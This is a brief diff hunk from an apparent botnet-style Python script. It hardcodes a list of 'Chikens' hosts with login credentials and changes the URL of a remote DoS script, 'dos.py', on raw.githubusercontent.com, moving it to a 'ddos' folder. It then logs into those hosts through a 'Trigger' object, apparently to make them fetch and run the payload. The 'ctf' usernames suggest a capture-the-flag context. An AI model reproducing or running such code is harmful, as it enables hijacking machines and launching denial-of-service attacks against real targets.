@@ -65,7 +65,7 @@ if __name__ == '__main__':
     Chikens = [{'host': b'153.0.0.171', 'user':b'ctf','passwd': b'ctff1234'},
             {'host':b'153.0.0.181','user':b'ctf','passwd':b'test1234'}]
 
-    path = b'https://raw.githubusercontent.com/bl201809/bllist/master/dos/dos.py'
+    path = b'https://raw.githubusercontent.com/bl201809/bllist/master/ddos/dos.py'
 
     hack = Trigger()
     devs = hack.login(Chikens)
